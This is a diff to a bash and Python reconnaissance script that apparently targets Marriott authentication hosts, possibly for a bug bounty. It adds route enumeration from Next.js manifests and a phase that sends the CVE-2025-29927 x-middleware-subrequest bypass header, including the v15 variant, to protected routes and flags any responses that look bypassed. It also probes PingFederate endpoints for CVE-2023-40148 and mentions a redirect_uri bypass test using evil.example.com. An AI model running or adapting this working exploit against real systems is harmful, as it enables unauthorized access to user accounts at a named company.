@@ -27,10 +27,22 @@
 # PHASES:
 #   A — Decode SAMLRequest from efast-body.html (ACS URL discovery)
 #   B — Download + mine graphql-chunk + nodeForge vendor bundle (auth-apc)
-#   C — auth-apc OIDC/Next.js API surface probe
+#   C — auth-apc OIDC/Next.js API surface probe + buildManifest route enum
 #   D — Probe efast ACS URL (from Phase A) for unsigned POST acceptance
 #   E — CT enum retry via Certspotter API + wayback CDX API
 #   F — Decision gate
+#   G — CVE probe: CVE-2025-29927 (Next.js middleware bypass) + CVE-2023-40148 (PingFederate SSRF)
+#
+# CVE INTEL (researched 2026-06-22):
+#   CVE-2025-29927 — Next.js middleware auth bypass (CVSS 9.1, fixed 14.2.25/15.2.3)
+#     Exploit: send any protected GET with header "x-middleware-subrequest: middleware"
+#     For v15+: header value = "middleware:middleware:middleware:middleware:middleware" (5x)
+#     The middleware path component = location of middleware.ts relative to project root
+#     Test values: "middleware", "src/middleware", "pages/middleware"
+#     Impact: ALL middleware-protected routes accessible without auth — Critical if auth is middleware-only
+#   CVE-2023-40148 — PingFederate unauthenticated SSRF (CVSS 6.5, affects PF >= 11.0.0)
+#     Via forged HTTP POST to PingFederate runtime endpoints (adapter callbacks, ext/ref)
+#     Impact: SSRF to internal network resources
 #
 # OUTPUT: /tmp/s18/
 # SAFE: GET only unless Phase D ACS POST (benign unsigned assertion, no real creds)
@@ -477,17 +489,81 @@ except Exception as e:
   echo "C3a: Build ID = '${BUILD_ID}'"
 
   if [ -n "$BUILD_ID" ] && [ "$BUILD_ID" != "" ]; then
+    echo ""
+    echo "--- C3b: Fetch _buildManifest.js (enumerates ALL app pages/routes) ---"
+    # This is the canonical way to enumerate all Next.js pages without brute force
+    BUILD_MANIFEST_URL="${BASE_URL_APC}/_next/static/${BUILD_ID}/_buildManifest.js"
+    echo "C3b: Fetching $BUILD_MANIFEST_URL"
+    curl -s --max-time 20 \
+      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
+      "$BUILD_MANIFEST_URL" \
+      -o "$OUTDIR/buildManifest.js"
+    BM_SIZE=$(wc -c < "$OUTDIR/buildManifest.js" 2>/dev/null || echo 0)
+    echo "C3b: buildManifest.js: ${BM_SIZE}B"
+    if [ "$BM_SIZE" -gt 50 ]; then
+      echo "C3b: Routes found:"
+      python3 - <<PYEOF 2>/dev/null || true
+import re, json
+try:
+    js = open("$OUTDIR/buildManifest.js").read()
+    # Extract sortedPages array — the gold standard
+    m = re.search(r'"sortedPages"\s*:\s*(\[[^\]]+\])', js)
+    if m:
+        pages = json.loads(m.group(1))
+        print(f"  sortedPages ({len(pages)} routes):")
+        for p in sorted(pages):
+            print(f"    {p}")
+    else:
+        # Fallback: extract quoted paths
+        paths = re.findall(r'["\'](/[^"\']+)["\']', js)
+        paths = sorted(set(p for p in paths if p.startswith('/')))
+        print(f"  Paths ({len(paths)}):")
+        for p in paths[:50]:
+            print(f"    {p}")
+except Exception as e:
+    print(f"  Error: {e}")
+    print(open("$OUTDIR/buildManifest.js").read()[:500])
+PYEOF
+    fi
+
+    echo ""
+    echo "--- C3c: Fetch _middlewareManifest.js (reveals middleware file path — critical for CVE-2025-29927) ---"
+    MW_MANIFEST_URL="${BASE_URL_APC}/_next/static/${BUILD_ID}/_middlewareManifest.js"
+    echo "C3c: Fetching $MW_MANIFEST_URL"
+    curl -s --max-time 15 \
+      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
+      "$MW_MANIFEST_URL" \
+      -o "$OUTDIR/middlewareManifest.js"
+    MW_SIZE=$(wc -c < "$OUTDIR/middlewareManifest.js" 2>/dev/null || echo 0)
+    echo "C3c: middlewareManifest.js: ${MW_SIZE}B"
+    if [ "$MW_SIZE" -gt 10 ]; then
+      cat "$OUTDIR/middlewareManifest.js"
+      # Extract middleware path — this is the exact value needed for CVE-2025-29927
+      python3 - <<PYEOF 2>/dev/null || true
+import re
+js = open("$OUTDIR/middlewareManifest.js").read()
+# Look for middleware file path (e.g. "middleware" or "src/middleware")
+paths = re.findall(r'["\']([a-z_/]+middleware[a-z_/]*)["\']', js, re.IGNORECASE)
+if paths:
+    print(f"\nC3c: Middleware paths (use these as x-middleware-subrequest value):")
+    for p in sorted(set(paths)):
+        print(f"  {p}")
+PYEOF
+    fi
+
+    echo ""
+    echo "--- C3d: Next.js data fetch for enumerated pages ---"
     for page in "login" "index" "home" "error"; do
       resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
         -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
         "${BASE_URL_APC}/_next/data/${BUILD_ID}/${page}.json" 2>/dev/null || echo "000|0")
       code=$(echo "$resp" | cut -d'|' -f1)
       size=$(echo "$resp" | cut -d'|' -f2)
-      echo "C3 /_next/data/${BUILD_ID}/${page}.json: ${code}/${size}B"
+      echo "C3d /_next/data/${BUILD_ID}/${page}.json: ${code}/${size}B"
       sleep 1
     done
   else
-    echo "C3: Build ID not found — skipping /_next/data/ probes"
+    echo "C3: Build ID not found — skipping /_next/data/ and manifest probes"
   fi
 fi
 
@@ -970,6 +1046,289 @@ print("2. If graphql-chunk has operations: test them unauthenticated from auth-a
 print("3. If OIDC config found: test redirect_uri bypass with evil.example.com")
 print("4. If new CT hosts found: scope-check all → probe any that are IN-SCOPE")
 print("5. If no new surface: pivot to Saviynt (M006) or franchise gateway cluster")
+
+PYEOF
+
+sleep 2
+
+# ─────────────────────────────────────────────────────────────────────────────
+echo ""
+echo "================================================================"
+echo "PHASE G — CVE probe: CVE-2025-29927 (Next.js) + CVE-2023-40148 (PingFederate)"
+echo "================================================================"
+# CVE-2025-29927: Next.js middleware auth bypass (CVSS 9.1)
+# Bypass: send any protected route with x-middleware-subrequest header
+# Value = path of middleware.ts relative to project root (no .ts extension)
+# Common values: "middleware", "src/middleware", "pages/middleware"
+# For Next.js v15+: repeat 5 times with colons: "middleware:middleware:..."
+# Impact: if protected routes are only guarded by middleware, full auth bypass
+#
+# CVE-2023-40148: PingFederate unauthenticated SSRF via forged HTTP POST
+# Affected: PingFederate >= 11.0.0 (Marriott likely runs this range)
+# Endpoint: likely /ext/ref/authenticate or adapter callback URLs
+# OAST canary: use burp collaborator or interactsh — but we use benign probe only
+
+scope_check "auth-apc.marriott.com" || { echo "SKIP Phase G"; }
+
+MW_HEADER_VALUES=("middleware" "src/middleware" "pages/middleware" "app/middleware")
+
+# Determine middleware path from Phase C3c if available
+if [ -f "$OUTDIR/middlewareManifest.js" ] && [ "$(wc -c < $OUTDIR/middlewareManifest.js)" -gt 10 ]; then
+  DETECTED_MW=$(python3 -c "
+import re
+js = open('$OUTDIR/middlewareManifest.js').read()
+paths = re.findall(r'[\"\'']([a-z_/]+middleware[a-z_/]*)[\"\'']', js, re.IGNORECASE)
+print(':'.join(sorted(set(p for p in paths if 'node_modules' not in p))[:3]))
+" 2>/dev/null || echo "")
+  if [ -n "$DETECTED_MW" ]; then
+    echo "G0: Detected middleware path from manifest: $DETECTED_MW"
+    MW_HEADER_VALUES=("$DETECTED_MW" "${MW_HEADER_VALUES[@]}")
+  fi
+fi
+
+echo ""
+echo "--- G1: CVE-2025-29927 — Baseline (no bypass header) ---"
+# First establish what the normal response looks like for a protected route
+# /login = public page. We need to find a protected route from buildManifest.js
+PROTECTED_ROUTES=()
+if [ -f "$OUTDIR/buildManifest.js" ]; then
+  mapfile -t PROTECTED_ROUTES < <(python3 - <<PYEOF 2>/dev/null || true
+import re, json
+js = open("$OUTDIR/buildManifest.js").read()
+m = re.search(r'"sortedPages"\s*:\s*(\[[^\]]+\])', js)
+if m:
+    pages = json.loads(m.group(1))
+    # Prioritize non-login pages (likely protected)
+    for p in pages:
+        if p not in ('/', '/login', '/404', '/500', '/_error'):
+            print(p)
+PYEOF
+)
+fi
+
+# Fall back to guessed protected routes if manifest not available
+if [ ${#PROTECTED_ROUTES[@]} -eq 0 ]; then
+  PROTECTED_ROUTES=("/account" "/dashboard" "/profile" "/home" "/settings" "/bookings" "/rewards" "/loyalty")
+fi
+
+echo "G1: Protected route candidates: ${PROTECTED_ROUTES[*]}"
+
+# Test first 3 protected routes for baseline
+for route in "${PROTECTED_ROUTES[@]:0:3}"; do
+  resp=$(curl -sv -o "$OUTDIR/g1-baseline$(echo $route | tr '/' '_').html" \
+    -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
+    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
+    "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
+  code=$(echo "$resp" | cut -d'|' -f1)
+  size=$(echo "$resp" | cut -d'|' -f2)
+  redir=$(echo "$resp" | cut -d'|' -f3)
+  echo "G1 baseline ${route}: ${code}/${size}B redir=${redir}"
+  sleep 1
+done
+
+echo ""
+echo "--- G2: CVE-2025-29927 — Bypass attempt with x-middleware-subrequest ---"
+echo "G2: Testing middleware header values: ${MW_HEADER_VALUES[*]}"
+for route in "${PROTECTED_ROUTES[@]:0:3}"; do
+  for mw_val in "${MW_HEADER_VALUES[@]}"; do
+    resp=$(curl -s -o "$OUTDIR/g2-bypass$(echo $route | tr '/' '_')-$(echo $mw_val | tr '/:' '__').html" \
+      -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
+      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
+      -H "x-middleware-subrequest: ${mw_val}" \
+      "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
+    code=$(echo "$resp" | cut -d'|' -f1)
+    size=$(echo "$resp" | cut -d'|' -f2)
+    redir=$(echo "$resp" | cut -d'|' -f3)
+    echo "G2 CVE-25-29927 [${mw_val}] ${route}: ${code}/${size}B redir=${redir}"
+    sleep 1
+  done
+
+  # Also test the v15 variant (5x colon-separated)
+  MW_V15="${MW_HEADER_VALUES[0]}:${MW_HEADER_VALUES[0]}:${MW_HEADER_VALUES[0]}:${MW_HEADER_VALUES[0]}:${MW_HEADER_VALUES[0]}"
+  resp=$(curl -s -o /dev/null \
+    -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
+    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
+    -H "x-middleware-subrequest: ${MW_V15}" \
+    "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
+  code=$(echo "$resp" | cut -d'|' -f1)
+  size=$(echo "$resp" | cut -d'|' -f2)
+  redir=$(echo "$resp" | cut -d'|' -f3)
+  echo "G2 CVE-25-29927 [v15-5x] ${route}: ${code}/${size}B redir=${redir}"
+  sleep 1
+done
+
+echo ""
+echo "--- G3: CVE-2025-29927 — Analyze bypass results ---"
+python3 - <<'PYEOF'
+import os, re, glob
+
+outdir = "/tmp/s18"
+bypass_files = glob.glob(f"{outdir}/g2-bypass*.html")
+baseline_files = glob.glob(f"{outdir}/g1-baseline*.html")
+
+baselines = {}
+for f in baseline_files:
+    try:
+        content = open(f).read()
+        key = os.path.basename(f).replace("g1-baseline","").replace(".html","")
+        baselines[key] = (len(content), content[:200])
+    except:
+        pass
+
+print("=== CVE-2025-29927 Bypass Analysis ===\n")
+for f in sorted(bypass_files):
+    try:
+        content = open(f).read()
+        fname = os.path.basename(f)
+        size = len(content)
+
+        # Check for bypass indicators vs redirect-to-login
+        login_redirect = bool(re.search(r'href=["\']/?login["\']|location:\s*/login|/login\?', content, re.IGNORECASE))
+        has_app_content = bool(re.search(r'(?:dashboard|account|profile|booking|rewards|loyalty|member)', content, re.IGNORECASE))
+        has_auth_error = bool(re.search(r'(?:unauthorized|forbidden|401|403|sign.in|log.in)', content, re.IGNORECASE))
+        has_session = bool(re.search(r'Set-Cookie.*(?:session|auth|token)', content, re.IGNORECASE))
+
+        status = "AMBIGUOUS"
+        if login_redirect and not has_app_content:
+            status = "BLOCKED (login redirect — not bypassed)"
+        elif has_app_content and not login_redirect:
+            status = "!!! POTENTIAL BYPASS — app content without login redirect !!!"
+        elif has_auth_error:
+            status = "BLOCKED (auth error)"
+        elif size < 200:
+            status = "BLOCKED (empty/tiny response)"
+
+        print(f"  {fname}")
+        print(f"    Size: {size}B | Status: {status}")
+        if "BYPASS" in status:
+            print(f"    Content preview: {content[:300]}")
+        print()
+    except Exception as e:
+        print(f"  {f}: Error {e}")
+
+PYEOF
+
+echo ""
+echo "--- G4: CVE-2023-40148 — PingFederate SSRF probe on auth-apc ---"
+# PingFederate SSRF via forged HTTP POST to adapter/authentication endpoints
+# Common PingFederate endpoints that can trigger SSRF:
+#   /ext/ref/authenticate — external reference adapter (URL-based, can trigger outbound HTTP)
+#   /idp/ping.oauth2 — OAuth2 ping endpoint
+#   /as/authorization.oauth2 with crafted redirect_uri — may proxy internal resources
+#   /pf/adapter/idp/ — IDP adapter endpoints
+#
+# SAFE PROBE: We probe if these paths exist (200/302) vs don't exist (404/000)
+# We do NOT send arbitrary SSRF payloads — just check for endpoint existence
+# If endpoints exist, note as potential SSRF surface for manual testing
+
+echo "G4: Probing PingFederate runtime endpoints for CVE-2023-40148 surface..."
+for path in \
+  "/ext/ref/authenticate" \
+  "/ext/ref/openid/authenticate" \
+  "/pf/adapter/idp" \
+  "/idp/ping.oauth2" \
+  "/as/authorization.oauth2" \
+  "/pf/heartbeat.ping" \
+  "/pf/pingfederate-ws/users" \
+  "/pf-ws/rest/v1/resources" \
+  "/ext/ref/login" \
+  "/sp/startSSO.ping" \
+  "/idp/startSSO.ping"
+do
+  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
+    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
+    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
+  code=$(echo "$resp" | cut -d'|' -f1)
+  size=$(echo "$resp" | cut -d'|' -f2)
+  echo "G4 ${path}: ${code}/${size}B"
+  sleep 1
+done
+
+echo ""
+echo "--- G5: CVE-2025-29927 — Determine Next.js version from chunk filenames ---"
+# Next.js embeds its version in package.json inside the chunks.
+# Also: known chunk hash patterns differ between major versions.
+# Try fetching package.json from static assets
+if [ -n "${BUILD_ID:-}" ]; then
+  for path in \
+    "/_next/static/chunks/framework-${BUILD_ID}.js" \
+    "/_next/static/${BUILD_ID}/_ssgManifest.js" \
+    "/_next/static/${BUILD_ID}/_middlewareManifest.js"
+  do
+    resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
+      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
+      "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
+    code=$(echo "$resp" | cut -d'|' -f1)
+    size=$(echo "$resp" | cut -d'|' -f2)
+    echo "G5 ${path}: ${code}/${size}B"
+    sleep 1
+  done
+fi
+
+# Also check framework chunk (contains React/Next version)
+FRAMEWORK_CHUNK=$(ls "$APC_CHUNKS_DIR"/framework-*.js 2>/dev/null | head -1 || echo "")
+if [ -n "$FRAMEWORK_CHUNK" ]; then
+  echo "G5: Framework chunk found at $FRAMEWORK_CHUNK, extracting Next.js version..."
+  python3 - <<PYEOF 2>/dev/null || true
+import re
+try:
+    js = open("$FRAMEWORK_CHUNK").read()
+    # next version string patterns
+    m = re.search(r'\"next\"\s*:\s*\"([^\"]+)\"', js)
+    if m:
+        print(f"  Next.js version: {m.group(1)}")
+    m2 = re.search(r'next[_/]([0-9]+\.[0-9]+\.[0-9]+)', js)
+    if m2:
+        print(f"  Next.js version (alt): {m2.group(1)}")
+    m3 = re.search(r'react@([0-9]+\.[0-9]+\.[0-9]+)', js)
+    if m3:
+        print(f"  React version: {m3.group(1)}")
+except:
+    pass
+PYEOF
+else
+  echo "G5: Framework chunk not in cache. Try: grep framework $OUTDIR/apc-login.html | head -5"
+  if [ -f "$OUTDIR/apc-login.html" ]; then
+    grep -oP '_next/static/chunks/[^"]+framework[^"]+\.js' "$OUTDIR/apc-login.html" | head -3 || true
+  fi
+fi
+
+echo ""
+echo "--- G6: CVE-2025-29927 summary and verdict ---"
+python3 - <<'PYEOF'
+import os, re, glob
+
+outdir = "/tmp/s18"
+print("=== CVE-2025-29927 VERDICT ===")
+
+# Count bypass vs blocked results
+bypass_files = glob.glob(f"{outdir}/g2-bypass*.html")
+bypassed = []
+blocked = []
+for f in bypass_files:
+    try:
+        content = open(f).read()
+        has_redirect = bool(re.search(r'href=["\']/?login["\']|/login\?', content, re.IGNORECASE))
+        has_content = bool(re.search(r'(?:dashboard|account|profile|booking|rewards|loyalty|member)', content, re.IGNORECASE))
+        if has_content and not has_redirect:
+            bypassed.append(os.path.basename(f))
+        else:
+            blocked.append(os.path.basename(f))
+    except:
+        pass
+
+if bypassed:
+    print(f"\n!!! CRITICAL FINDING — CVE-2025-29927 CONFIRMED VULNERABLE !!!")
+    print(f"  {len(bypassed)} routes bypassed: {bypassed}")
+    print(f"  Report as: Next.js Middleware Auth Bypass (CVE-2025-29927)")
+    print(f"  Severity: Critical (CVSS 9.1)")
+    print(f"  Impact: All middleware-protected routes accessible without authentication")
+elif blocked:
+    print(f"\n  MITIGATED — all {len(blocked)} tested routes returned auth redirect with bypass header")
+    print(f"  Either patched (14.2.25+/15.2.3+) or auth not solely in middleware")
+else:
+    print(f"\n  No bypass files generated — protected routes not found or Phase G not run")
+    print(f"  Action: manually test known protected routes with x-middleware-subrequest header")
 
 PYEOF
 
